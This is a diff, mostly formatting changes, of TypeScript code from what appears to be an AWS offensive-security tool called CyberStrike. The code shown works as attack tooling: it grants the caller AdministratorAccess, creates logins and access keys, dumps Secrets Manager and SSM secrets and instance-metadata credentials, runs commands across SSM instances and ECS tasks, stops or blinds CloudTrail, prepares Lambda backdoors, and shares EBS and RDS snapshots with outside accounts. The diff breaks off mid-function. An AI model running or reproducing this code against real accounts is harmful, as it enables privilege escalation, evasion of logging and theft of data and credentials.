@@ -75,12 +75,25 @@ const PROGRAMS = {
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
-type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
+type Finding = {
+  checkId: string
+  provider: string
+  severity: string
+  status: string
+  resource: string
+  title: string
+  details: string
+  remediation: string
+}
 type HookResult = { output: string; findings: Finding[] }
 
 // ── CLI helpers ──
 
-async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
+async function run(
+  cmd: string,
+  args: string[],
+  timeout: number,
+): Promise<{ stdout: string; stderr: string; exitCode: number }> {
   const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
   const timer = setTimeout(() => proc.kill(), timeout * 1000)
   const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
@@ -89,7 +102,12 @@ async function run(cmd: string, args: string[], timeout: number): Promise<{ stdo
 }
 
 function aws(args: string[], profile: string | undefined, region: string | undefined, timeout: number) {
-  const extra = [...(profile ? ["--profile", profile] : []), ...(region ? ["--region", region] : []), "--output", "json"]
+  const extra = [
+    ...(profile ? ["--profile", profile] : []),
+    ...(region ? ["--region", region] : []),
+    "--output",
+    "json",
+  ]
   return run("aws", [...args, ...extra], timeout)
 }
 
@@ -103,7 +121,11 @@ function hasFlag(args: string[], flag: string): boolean {
 }
 
 function tryJson(s: string) {
-  try { return JSON.parse(s) } catch { return null }
+  try {
+    return JSON.parse(s)
+  } catch {
+    return null
+  }
 }
 
 // ── Program implementations ──
@@ -130,30 +152,77 @@ async function iamEnum(args: string[], timeout: number): Promise<HookResult> {
     const rl = tryJson(roles.stdout) || []
     output.push(`[+] IAM Roles: ${rl.length}`)
     for (const r of rl) {
-      const rp = await aws(["iam", "list-attached-role-policies", "--role-name", r[0], "--query", "AttachedPolicies[].PolicyArn"], profile, region, timeout)
+      const rp = await aws(
+        ["iam", "list-attached-role-policies", "--role-name", r[0], "--query", "AttachedPolicies[].PolicyArn"],
+        profile,
+        region,
+        timeout,
+      )
       const policies = tryJson(rp.stdout) || []
       const hasAdmin = policies.some((p: string) => p.includes("AdministratorAccess"))
       if (hasAdmin) {
         output.push(`    [!] ${r[0]}: AdministratorAccess attached`)
-        findings.push({ checkId: "AWS-ENUM-001", provider: "aws", severity: "critical", status: "FAIL", resource: r[1], title: `Role with AdministratorAccess: ${r[0]}`, details: `${r[0]} has AdministratorAccess policy`, remediation: "Replace with least-privilege policy" })
+        findings.push({
+          checkId: "AWS-ENUM-001",
+          provider: "aws",
+          severity: "critical",
+          status: "FAIL",
+          resource: r[1],
+          title: `Role with AdministratorAccess: ${r[0]}`,
+          details: `${r[0]} has AdministratorAccess policy`,
+          remediation: "Replace with least-privilege policy",
+        })
       }
     }
   }
 
-  const policies = await aws(["iam", "list-policies", "--scope", "Local", "--query", "Policies[].[PolicyName,Arn]"], profile, region, timeout)
+  const policies = await aws(
+    ["iam", "list-policies", "--scope", "Local", "--query", "Policies[].[PolicyName,Arn]"],
+    profile,
+    region,
+    timeout,
+  )
   if (policies.exitCode === 0) {
     const pl = tryJson(policies.stdout) || []
     output.push(`[+] Custom Policies: ${pl.length}`)
     for (const p of pl) {
-      const ver = await aws(["iam", "get-policy", "--policy-arn", p[1], "--query", "Policy.DefaultVersionId"], profile, region, timeout)
+      const ver = await aws(
+        ["iam", "get-policy", "--policy-arn", p[1], "--query", "Policy.DefaultVersionId"],
+        profile,
+        region,
+        timeout,
+      )
       const versionId = tryJson(ver.stdout)
       if (versionId) {
-        const doc = await aws(["iam", "get-policy-version", "--policy-arn", p[1], "--version-id", versionId, "--query", "PolicyVersion.Document"], profile, region, timeout)
+        const doc = await aws(
+          [
+            "iam",
+            "get-policy-version",
+            "--policy-arn",
+            p[1],
+            "--version-id",
+            versionId,
+            "--query",
+            "PolicyVersion.Document",
+          ],
+          profile,
+          region,
+          timeout,
+        )
         const d = tryJson(doc.stdout)
         const statements = Array.isArray(d?.Statement) ? d.Statement : []
         for (const st of statements) {
           if (st.Effect === "Allow" && st.Action === "*" && st.Resource === "*") {
-            findings.push({ checkId: "AWS-ENUM-002", provider: "aws", severity: "critical", status: "FAIL", resource: p[1], title: `Wildcard policy: ${p[0]}`, details: "Allow *:* — full admin equivalent", remediation: "Scope down actions and resources" })
+            findings.push({
+              checkId: "AWS-ENUM-002",
+              provider: "aws",
+              severity: "critical",
+              status: "FAIL",
+              resource: p[1],
+              title: `Wildcard policy: ${p[0]}`,
+              details: "Allow *:* — full admin equivalent",
+              remediation: "Scope down actions and resources",
+            })
           }
         }
       }
@@ -164,7 +233,16 @@ async function iamEnum(args: string[], timeout: number): Promise<HookResult> {
   if (summary.exitCode === 0) {
     const s = tryJson(summary.stdout)?.SummaryMap || {}
     if (s.AccountAccessKeysPresent > 0) {
-      findings.push({ checkId: "AWS-ENUM-003", provider: "aws", severity: "critical", status: "FAIL", resource: "root", title: "Root account has access keys", details: "Root access keys are active", remediation: "Delete root access keys" })
+      findings.push({
+        checkId: "AWS-ENUM-003",
+        provider: "aws",
+        severity: "critical",
+        status: "FAIL",
+        resource: "root",
+        title: "Root account has access keys",
+        details: "Root access keys are active",
+        remediation: "Delete root access keys",
+      })
     }
     output.push(`\n[*] Account Summary: ${s.Users} users, ${s.Roles} roles, ${s.Groups} groups, ${s.Policies} policies`)
   }
@@ -174,7 +252,11 @@ async function iamEnum(args: string[], timeout: number): Promise<HookResult> {
 
 async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> {
   const method = argVal(args, "--method")
-  if (!method) return { output: "ERROR: --method required (passrole|assumerole|attach_policy|create_login|create_key)", findings: [] }
+  if (!method)
+    return {
+      output: "ERROR: --method required (passrole|assumerole|attach_policy|create_login|create_key)",
+      findings: [],
+    }
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
   const roleArn = argVal(args, "--role-arn")
@@ -186,15 +268,26 @@ async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> 
     const roles = tryJson(r.stdout) || []
     if (roles.length === 0) return { output: `[-] Role not found: ${roleArn}`, findings: [] }
     const trust = roles[0].AssumeRolePolicyDocument
-    return { output: `[+] Role: ${roleArn}\n[+] Trust policy:\n${JSON.stringify(trust, null, 2)}\n[*] Check if current identity can iam:PassRole + lambda:CreateFunction`, findings: [] }
+    return {
+      output: `[+] Role: ${roleArn}\n[+] Trust policy:\n${JSON.stringify(trust, null, 2)}\n[*] Check if current identity can iam:PassRole + lambda:CreateFunction`,
+      findings: [],
+    }
   }
 
   if (method === "assumerole") {
     if (!roleArn) return { output: "ERROR: --role-arn required for assumerole", findings: [] }
-    const r = await aws(["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", "cyberstrike"], profile, region, timeout)
+    const r = await aws(
+      ["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", "cyberstrike"],
+      profile,
+      region,
+      timeout,
+    )
     if (r.exitCode === 0) {
       const creds = tryJson(r.stdout)?.Credentials
-      return { output: `[+] AssumeRole successful: ${roleArn}\n    AccessKeyId: ${creds?.AccessKeyId}\n    Expiration: ${creds?.Expiration}`, findings: [] }
+      return {
+        output: `[+] AssumeRole successful: ${roleArn}\n    AccessKeyId: ${creds?.AccessKeyId}\n    Expiration: ${creds?.Expiration}`,
+        findings: [],
+      }
     }
     return { output: `[-] AssumeRole failed: ${r.stderr.trim()}`, findings: [] }
   }
@@ -204,7 +297,19 @@ async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> 
     const arn = tryJson(id.stdout)?.Arn || ""
     const username = arn.split("/").pop()
     if (!username) return { output: "[-] Cannot determine current username", findings: [] }
-    const r = await aws(["iam", "attach-user-policy", "--user-name", username, "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"], profile, region, timeout)
+    const r = await aws(
+      [
+        "iam",
+        "attach-user-policy",
+        "--user-name",
+        username,
+        "--policy-arn",
+        "arn:aws:iam::aws:policy/AdministratorAccess",
+      ],
+      profile,
+      region,
+      timeout,
+    )
     if (r.exitCode === 0) return { output: `[+] AdministratorAccess attached to ${username}`, findings: [] }
     return { output: `[-] attach_policy failed: ${r.stderr.trim()}`, findings: [] }
   }
@@ -214,8 +319,14 @@ async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> 
     const username = (tryJson(id.stdout)?.Arn || "").split("/").pop()
     if (!username) return { output: "[-] Cannot determine current username", findings: [] }
     const pw = `CyStr!ke${Date.now().toString(36)}`
-    const r = await aws(["iam", "create-login-profile", "--user-name", username, "--password", pw, "--no-password-reset-required"], profile, region, timeout)
-    if (r.exitCode === 0) return { output: `[+] Console login created for ${username}\n    Password: ${pw}`, findings: [] }
+    const r = await aws(
+      ["iam", "create-login-profile", "--user-name", username, "--password", pw, "--no-password-reset-required"],
+      profile,
+      region,
+      timeout,
+    )
+    if (r.exitCode === 0)
+      return { output: `[+] Console login created for ${username}\n    Password: ${pw}`, findings: [] }
     return { output: `[-] create_login failed: ${r.stderr.trim()}`, findings: [] }
   }
 
@@ -226,7 +337,10 @@ async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> 
     const r = await aws(["iam", "create-access-key", "--user-name", username], profile, region, timeout)
     if (r.exitCode === 0) {
       const key = tryJson(r.stdout)?.AccessKey
-      return { output: `[+] Access key created for ${username}\n    AccessKeyId: ${key?.AccessKeyId}\n    SecretAccessKey: ${key?.SecretAccessKey}`, findings: [] }
+      return {
+        output: `[+] Access key created for ${username}\n    AccessKeyId: ${key?.AccessKeyId}\n    SecretAccessKey: ${key?.SecretAccessKey}`,
+        findings: [],
+      }
     }
     return { output: `[-] create_key failed: ${r.stderr.trim()}`, findings: [] }
   }
@@ -245,7 +359,7 @@ async function s3Dump(args: string[], timeout: number): Promise<HookResult> {
   if (bucket) {
     const r = await aws(["s3", "ls", `s3://${bucket}`, "--recursive"], profile, region, timeout)
     if (r.exitCode !== 0) return { output: `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`, findings: [] }
-    const files = r.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
+    const files = r.stdout.split("\n").filter((f) => new RegExp(sensitivePattern, "i").test(f))
     const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files: ${files.length}`]
     for (const f of files) output.push(`    ${f.trim()}`)
     if (download && files.length > 0) {
@@ -265,8 +379,11 @@ async function s3Dump(args: string[], timeout: number): Promise<HookResult> {
 
   for (const b of buckets) {
     const lr = await aws(["s3", "ls", `s3://${b}`, "--recursive"], profile, region, timeout)
-    if (lr.exitCode !== 0) { output.push(`[-] ${b}: access denied`); continue }
-    const files = lr.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
+    if (lr.exitCode !== 0) {
+      output.push(`[-] ${b}: access denied`)
+      continue
+    }
+    const files = lr.stdout.split("\n").filter((f) => new RegExp(sensitivePattern, "i").test(f))
     output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
     for (const f of files.slice(0, 5)) output.push(`    ${f.trim()}`)
   }
@@ -289,10 +406,27 @@ async function lambdaBackdoor(args: string[], timeout: number): Promise<HookResu
     if (r.exitCode !== 0) return { output: `[-] Function not found: ${r.stderr.trim()}`, findings: [] }
     const func = tryJson(r.stdout)
     const cfg = func?.Configuration || {}
-    return { output: [`[*] Function: ${funcName}`, `[*] Runtime: ${cfg.Runtime}`, `[*] Role: ${cfg.Role}`, `[*] Handler: ${cfg.Handler}`, `[*] Code size: ${cfg.CodeSize} bytes`, `[+] Download code, inject callback to ${callbackUrl}, and update`].join("\n"), findings: [] }
+    return {
+      output: [
+        `[*] Function: ${funcName}`,
+        `[*] Runtime: ${cfg.Runtime}`,
+        `[*] Role: ${cfg.Role}`,
+        `[*] Handler: ${cfg.Handler}`,
+        `[*] Code size: ${cfg.CodeSize} bytes`,
+        `[+] Download code, inject callback to ${callbackUrl}, and update`,
+      ].join("\n"),
+      findings: [],
+    }
   }
 
-  return { output: [`[*] Create mode — would create new function '${funcName}'`, `[*] Callback: ${callbackUrl}`, `[+] Use: aws lambda create-function --function-name ${funcName} --runtime python3.11 --handler index.handler --role <HIGH_PRIV_ROLE_ARN> --zip-file fileb://payload.zip`].join("\n"), findings: [] }
+  return {
+    output: [
+      `[*] Create mode — would create new function '${funcName}'`,
+      `[*] Callback: ${callbackUrl}`,
+      `[+] Use: aws lambda create-function --function-name ${funcName} --runtime python3.11 --handler index.handler --role <HIGH_PRIV_ROLE_ARN> --zip-file fileb://payload.zip`,
+    ].join("\n"),
+    findings: [],
+  }
 }
 
 async function ssmExec(args: string[], timeout: number): Promise<HookResult> {
@@ -307,8 +441,13 @@ async function ssmExec(args: string[], timeout: number): Promise<HookResult> {
 
   const targets = allInstances
     ? (async () => {
-        const r = await aws(["ssm", "describe-instance-information", "--query", "InstanceInformationList[].InstanceId"], profile, region, timeout)
-        return r.exitCode === 0 ? (tryJson(r.stdout) || []) : []
+        const r = await aws(
+          ["ssm", "describe-instance-information", "--query", "InstanceInformationList[].InstanceId"],
+          profile,
+          region,
+          timeout,
+        )
+        return r.exitCode === 0 ? tryJson(r.stdout) || [] : []
       })()
     : Promise.resolve([instanceId!])
 
@@ -317,12 +456,33 @@ async function ssmExec(args: string[], timeout: number): Promise<HookResult> {
 
   const output = [`[*] SSM RunCommand — ${instances.length} target(s)\n`]
   for (const id of instances) {
-    const r = await aws(["ssm", "send-command", "--instance-ids", id, "--document-name", "AWS-RunShellScript", "--parameters", `commands=["${command}"]`, "--query", "Command.CommandId"], profile, region, timeout)
+    const r = await aws(
+      [
+        "ssm",
+        "send-command",
+        "--instance-ids",
+        id,
+        "--document-name",
+        "AWS-RunShellScript",
+        "--parameters",
+        `commands=["${command}"]`,
+        "--query",
+        "Command.CommandId",
+      ],
+      profile,
+      region,
+      timeout,
+    )
     if (r.exitCode === 0) {
       const cmdId = tryJson(r.stdout)
       output.push(`[+] ${id}: command sent (${cmdId})`)
-      await new Promise(resolve => setTimeout(resolve, 2000))
-      const gr = await aws(["ssm", "get-command-invocation", "--command-id", cmdId, "--instance-id", id], profile, region, timeout)
+      await new Promise((resolve) => setTimeout(resolve, 2000))
+      const gr = await aws(
+        ["ssm", "get-command-invocation", "--command-id", cmdId, "--instance-id", id],
+        profile,
+        region,
+        timeout,
+      )
       if (gr.exitCode === 0) {
         const inv = tryJson(gr.stdout)
         output.push(`    Status: ${inv?.Status}`)
@@ -348,8 +508,9 @@ async function metadataHarvest(args: string[]): Promise<HookResult> {
         headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" },
         signal: AbortSignal.timeout(5000),
       })
-      if (!tokenResp.ok) { output.push("[-] IMDSv2 token request failed, trying v1...") }
-      else {
+      if (!tokenResp.ok) {
+        output.push("[-] IMDSv2 token request failed, trying v1...")
+      } else {
         const token = await tokenResp.text()
         const headers = { "X-aws-ec2-metadata-token": token }
         const endpoints: Record<string, string> = {
@@ -367,10 +528,15 @@ async function metadataHarvest(args: string[]): Promise<HookResult> {
             output.push(`[+] ${name}: ${text.slice(0, 120)}${text.length > 120 ? "..." : ""}`)
             if (name === "iam_role" && text.trim()) {
               const roleName = text.trim().split("\n")[0]
-              const creds = await fetch(`${base}/latest/meta-data/iam/security-credentials/${roleName}`, { headers, signal: AbortSignal.timeout(5000) })
+              const creds = await fetch(`${base}/latest/meta-data/iam/security-credentials/${roleName}`, {
+                headers,
+                signal: AbortSignal.timeout(5000),
+              })
               if (creds.ok) {
                 const c = await creds.json()
-                output.push(`[+] credentials: AccessKeyId=${String(c.AccessKeyId).slice(0, 8)}... Token=${String(c.Token).slice(0, 20)}...`)
+                output.push(
+                  `[+] credentials: AccessKeyId=${String(c.AccessKeyId).slice(0, 8)}... Token=${String(c.Token).slice(0, 20)}...`,
+                )
               }
             }
           } else {
@@ -424,10 +590,12 @@ async function cloudtrailBlind(args: string[], timeout: number): Promise<HookRes
   }
 
   if (action === "stop") {
-    const name = trailName || (await (async () => {
-      const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
-      return tryJson(r.stdout)
-    })())
+    const name =
+      trailName ||
+      (await (async () => {
+        const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
+        return tryJson(r.stdout)
+      })())
     if (!name) return { output: "[-] No trail found", findings: [] }
     const r = await aws(["cloudtrail", "stop-logging", "--name", name], profile, region, timeout)
     return r.exitCode === 0
@@ -436,22 +604,44 @@ async function cloudtrailBlind(args: string[], timeout: number): Promise<HookRes
   }
 
   if (action === "modify_selectors") {
-    const name = trailName || (await (async () => {
-      const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
-      return tryJson(r.stdout)
-    })())
+    const name =
+      trailName ||
+      (await (async () => {
+        const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
+        return tryJson(r.stdout)
+      })())
     if (!name) return { output: "[-] No trail found", findings: [] }
-    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", name, "--event-selectors", '[{"ReadWriteType":"ReadOnly","IncludeManagementEvents":false}]'], profile, region, timeout)
+    const r = await aws(
+      [
+        "cloudtrail",
+        "put-event-selectors",
+        "--trail-name",
+        name,
+        "--event-selectors",
+        '[{"ReadWriteType":"ReadOnly","IncludeManagementEvents":false}]',
+      ],
+      profile,
+      region,
+      timeout,
+    )
     return r.exitCode === 0
       ? { output: `[+] Event selectors modified on ${name} — management events excluded`, findings: [] }
       : { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
   }
 
   if (action === "delete_logs") {
-    const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].S3BucketName"], profile, region, timeout)
+    const r = await aws(
+      ["cloudtrail", "describe-trails", "--query", "trailList[0].S3BucketName"],
+      profile,
+      region,
+      timeout,
+    )
     const bucket = tryJson(r.stdout)
     if (!bucket) return { output: "[-] Cannot find CloudTrail S3 bucket", findings: [] }
-    return { output: `[*] CloudTrail logs in: s3://${bucket}\n[+] Use: aws s3 rm s3://${bucket}/AWSLogs/ --recursive`, findings: [] }
+    return {
+      output: `[*] CloudTrail logs in: s3://${bucket}\n[+] Use: aws s3 rm s3://${bucket}/AWSLogs/ --recursive`,
+      findings: [],
+    }
   }
 
   return { output: `ERROR: Unknown action: ${action}`, findings: [] }
@@ -464,12 +654,22 @@ async function secretsDump(args: string[], timeout: number): Promise<HookResult>
   const output: string[] = ["[*] AWS Secrets Dump\n"]
 
   if (service === "secretsmanager" || service === "all") {
-    const r = await aws(["secretsmanager", "list-secrets", "--query", "SecretList[].[Name,ARN]"], profile, region, timeout)
+    const r = await aws(
+      ["secretsmanager", "list-secrets", "--query", "SecretList[].[Name,ARN]"],
+      profile,
+      region,
+      timeout,
+    )
     if (r.exitCode === 0) {
       const secrets = tryJson(r.stdout) || []
       output.push(`[+] Secrets Manager: ${secrets.length} secret(s)`)
       for (const s of secrets) {
-        const val = await aws(["secretsmanager", "get-secret-value", "--secret-id", s[0], "--query", "SecretString"], profile, region, timeout)
+        const val = await aws(
+          ["secretsmanager", "get-secret-value", "--secret-id", s[0], "--query", "SecretString"],
+          profile,
+          region,
+          timeout,
+        )
         if (val.exitCode === 0) {
           const v = tryJson(val.stdout) || val.stdout
           output.push(`[+] ${s[0]}: ${String(v).slice(0, 80)}${String(v).length > 80 ? "..." : ""}`)
@@ -487,7 +687,12 @@ async function secretsDump(args: string[], timeout: number): Promise<HookResult>
       const secure = params.filter((p: string[]) => p[1] === "SecureString")
       output.push(`[+] SSM Parameters: ${params.length} total, ${secure.length} SecureString`)
       for (const p of secure) {
-        const val = await aws(["ssm", "get-parameter", "--name", p[0], "--with-decryption", "--query", "Parameter.Value"], profile, region, timeout)
+        const val = await aws(
+          ["ssm", "get-parameter", "--name", p[0], "--with-decryption", "--query", "Parameter.Value"],
+          profile,
+          region,
+          timeout,
+        )
         if (val.exitCode === 0) {
           const v = tryJson(val.stdout) || val.stdout
           output.push(`[+] ${p[0]}: ${String(v).slice(0, 80)}${String(v).length > 80 ? "..." : ""}`)
@@ -509,14 +714,46 @@ async function ec2Snapshot(args: string[], timeout: number): Promise<HookResult>
 
   if (!volumeId) return { output: "ERROR: --volume-id required", findings: [] }
 
-  const r = await aws(["ec2", "create-snapshot", "--volume-id", volumeId, "--description", "CyberStrike forensic snapshot", "--tag-specifications", 'ResourceType=snapshot,Tags=[{Key=CreatedBy,Value=CyberStrike}]'], profile, region, timeout)
+  const r = await aws(
+    [
+      "ec2",
+      "create-snapshot",
+      "--volume-id",
+      volumeId,
+      "--description",
+      "CyberStrike forensic snapshot",
+      "--tag-specifications",
+      "ResourceType=snapshot,Tags=[{Key=CreatedBy,Value=CyberStrike}]",
+    ],
+    profile,
+    region,
+    timeout,
+  )
   if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings: [] }
   const snap = tryJson(r.stdout)
   const output = [`[+] Snapshot created: ${snap?.SnapshotId}`, `    Volume: ${volumeId}`, `    State: ${snap?.State}`]
 
   if (shareAccount) {
-    const sr = await aws(["ec2", "modify-snapshot-attribute", "--snapshot-id", snap?.SnapshotId, "--attribute", "createVolumePermission", "--operation-type", "add", "--user-ids", shareAccount], profile, region, timeout)
-    output.push(sr.exitCode === 0 ? `[+] Shared with account: ${shareAccount}` : `[-] Sharing failed: ${sr.stderr.trim()}`)
+    const sr = await aws(
+      [
+        "ec2",
+        "modify-snapshot-attribute",
+        "--snapshot-id",
+        snap?.SnapshotId,
+        "--attribute",
+        "createVolumePermission",
+        "--operation-type",
+        "add",
+        "--user-ids",
+        shareAccount,
+      ],
+      profile,
+      region,
+      timeout,
+    )
+    output.push(
+      sr.exitCode === 0 ? `[+] Shared with account: ${shareAccount}` : `[-] Sharing failed: ${sr.stderr.trim()}`,
+    )
   }
 
   return { output: output.join("\n"), findings: [] }
@@ -531,7 +768,17 @@ async function rdsDump(args: string[], timeout: number): Promise<HookResult> {
   const findings: Finding[] = []
 
   if (!dbId) {
-    const r = await aws(["rds", "describe-db-instances", "--query", "DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus,Endpoint.Address]"], profile, region, timeout)
+    const r = await aws(
+      [
+        "rds",
+        "describe-db-instances",
+        "--query",
+        "DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus,Endpoint.Address]",
+      ],
+      profile,
+      region,
+      timeout,
+    )
     if (r.exitCode !== 0) return { output: `[-] Cannot list RDS instances: ${r.stderr.trim()}`, findings }
     const dbs = tryJson(r.stdout) || []
     const output = [`[*] RDS Instances: ${dbs.length}\n`]
@@ -542,29 +789,70 @@ async function rdsDump(args: string[], timeout: number): Promise<HookResult> {
 
   const output = [`[*] RDS Snapshot — target: ${dbId}\n`]
   const snapId = `cs-snap-${Date.now()}`
-  const r = await aws(["rds", "create-db-snapshot", "--db-instance-identifier", dbId, "--db-snapshot-identifier", snapId, "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
+  const r = await aws(
+    [
+      "rds",
+      "create-db-snapshot",
+      "--db-instance-identifier",
+      dbId,
+      "--db-snapshot-identifier",
+      snapId,
+      "--tags",
+      "Key=CreatedBy,Value=CyberStrike",
+    ],
+    profile,
+    region,
+    timeout,
+  )
   if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings }
 
   output.push(`[+] Snapshot created: ${snapId}`)
   output.push(`[*] Waiting for snapshot to become available...`)
 
-  const wait = await aws(["rds", "wait", "db-snapshot-available", "--db-snapshot-identifier", snapId], profile, region, timeout)
+  const wait = await aws(
+    ["rds", "wait", "db-snapshot-available", "--db-snapshot-identifier", snapId],
+    profile,
+    region,
+    timeout,
+  )
   if (wait.exitCode === 0) output.push(`[+] Snapshot available`)
 
   findings.push({
-    checkId: "AWS-RDS-001", provider: "aws", severity: "critical", status: "EXTRACTED",
-    resource: `rds:${dbId}`, title: `RDS snapshot created: ${snapId}`,
+    checkId: "AWS-RDS-001",
+    provider: "aws",
+    severity: "critical",
+    status: "EXTRACTED",
+    resource: `rds:${dbId}`,
+    title: `RDS snapshot created: ${snapId}`,
     details: `Snapshot of ${dbId} created for data extraction`,
     remediation: "Delete snapshot after engagement: aws rds delete-db-snapshot",
   })
 
   if (shareAccount) {
-    const sr = await aws(["rds", "modify-db-snapshot-attribute", "--db-snapshot-identifier", snapId, "--attribute-name", "restore", "--values-to-add", shareAccount], profile, region, timeout)
+    const sr = await aws(
+      [
+        "rds",
+        "modify-db-snapshot-attribute",
+        "--db-snapshot-identifier",
+        snapId,
+        "--attribute-name",
+        "restore",
+        "--values-to-add",
+        shareAccount,
+      ],
+      profile,
+      region,
+      timeout,
+    )
     if (sr.exitCode === 0) {
       output.push(`[+] Snapshot shared with account: ${shareAccount}`)
       findings.push({
-        checkId: "AWS-RDS-002", provider: "aws", severity: "critical", status: "SHARED",
-        resource: `rds:${snapId}`, title: `RDS snapshot shared cross-account: ${shareAccount}`,
+        checkId: "AWS-RDS-002",
+        provider: "aws",
+        severity: "critical",
+        status: "SHARED",
+        resource: `rds:${snapId}`,
+        title: `RDS snapshot shared cross-account: ${shareAccount}`,
         details: `Snapshot ${snapId} shared with AWS account ${shareAccount}`,
         remediation: "Revoke sharing after extraction",
       })
@@ -575,7 +863,23 @@ async function rdsDump(args: string[], timeout: number): Promise<HookResult> {
 
   if (restore) {
     const restoreId = `cs-restore-${Date.now()}`
-    const rr = await aws(["rds", "restore-db-instance-from-db-snapshot", "--db-instance-identifier", restoreId, "--db-snapshot-identifier", snapId, "--db-instance-class", "db.t3.micro", "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
+    const rr = await aws(
+      [
+        "rds",
+        "restore-db-instance-from-db-snapshot",
+        "--db-instance-identifier",
+        restoreId,
+        "--db-snapshot-identifier",
+        snapId,
+        "--db-instance-class",
+        "db.t3.micro",
+        "--tags",
+        "Key=CreatedBy,Value=CyberStrike",
+      ],
+      profile,
+      region,
+      timeout,
+    )
     if (rr.exitCode === 0) {
       output.push(`[+] Restoring snapshot to instance: ${restoreId}`)
       output.push(`[*] Wait for instance, then connect and extract data`)
@@ -606,15 +910,35 @@ async function ecsExec(args: string[], timeout: number): Promise<HookResult> {
       const output = [`[*] ECS Clusters: ${clusters.length}\n`]
       for (const c of clusters) output.push(`    ${c}`)
 
-      const tasks = await aws(["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"], profile, region, timeout)
+      const tasks = await aws(
+        ["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"],
+        profile,
+        region,
+        timeout,
+      )
       if (tasks.exitCode === 0) {
         const taskList = tryJson(tasks.stdout) || []
         output.push(`\n[+] Tasks in ${cluster}: ${taskList.length}`)
         if (taskList.length > 0) {
-          const desc = await aws(["ecs", "describe-tasks", "--cluster", cluster, "--tasks", ...taskList.slice(0, 10), "--query", "tasks[].[taskArn,lastStatus,containers[].name]"], profile, region, timeout)
+          const desc = await aws(
+            [
+              "ecs",
+              "describe-tasks",
+              "--cluster",
+              cluster,
+              "--tasks",
+              ...taskList.slice(0, 10),
+              "--query",
+              "tasks[].[taskArn,lastStatus,containers[].name]",
+            ],
+            profile,
+            region,
+            timeout,
+          )
           if (desc.exitCode === 0) {
             const taskDetails = tryJson(desc.stdout) || []
-            for (const t of taskDetails) output.push(`    ${t[0].split("/").pop()} (${t[1]}) — containers: ${(t[2] || []).join(",")}`)
+            for (const t of taskDetails)
+              output.push(`    ${t[0].split("/").pop()} (${t[1]}) — containers: ${(t[2] || []).join(",")}`)
           }
         }
       }
@@ -628,7 +952,12 @@ async function ecsExec(args: string[], timeout: number): Promise<HookResult> {
 
   const targetTasks = allTasks
     ? await (async () => {
-        const r = await aws(["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"], profile, region, timeout)
+        const r = await aws(
+          ["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"],
+          profile,
+          region,
+          timeout,
+        )
         return r.exitCode === 0 ? (tryJson(r.stdout) || []).map((t: string) => t.split("/").pop()) : []
       })()
     : [task!]
@@ -644,15 +973,21 @@ async function ecsExec(args: string[], timeout: number): Promise<HookResult> {
     if (r.exitCode === 0) {
       output.push(`[+] Task ${t}:\n${r.stdout.trim()}`)
       findings.push({
-        checkId: `AWS-ECS-${findings.length + 1}`, provider: "aws", severity: "high", status: "EXECUTED",
-        resource: `ecs:${cluster}/${t}`, title: `Command executed in ECS task: ${t}`,
+        checkId: `AWS-ECS-${findings.length + 1}`,
+        provider: "aws",
+        severity: "high",
+        status: "EXECUTED",
+        resource: `ecs:${cluster}/${t}`,
+        title: `Command executed in ECS task: ${t}`,
         details: `Command: ${command}, container: ${container || "default"}`,
         remediation: "Review ECS Exec audit logs in CloudTrail",
       })
     } else {
       output.push(`[-] Task ${t}: ${r.stderr.trim().split("\n")[0]}`)
       if (r.stderr.includes("ExecuteCommandNotEnabled")) {
-        output.push(`    [*] ECS Exec not enabled. Enable: aws ecs update-service --cluster ${cluster} --service SVC --enable-execute-command`)
+        output.push(
+          `    [*] ECS Exec not enabled. Enable: aws ecs update-service --cluster ${cluster} --service SVC --enable-execute-command`,
+        )
       }
     }
   }
@@ -668,7 +1003,11 @@ async function ssoEnum(args: string[], timeout: number): Promise<HookResult> {
   const output: string[] = ["[*] AWS SSO / IAM Identity Center Enumeration\n"]
 
   const instances = await aws(["sso-admin", "list-instances"], profile, region, timeout)
-  if (instances.exitCode !== 0) return { output: `[-] Cannot list SSO instances: ${instances.stderr.trim()}\n[*] SSO may not be configured or region may be wrong`, findings }
+  if (instances.exitCode !== 0)
+    return {
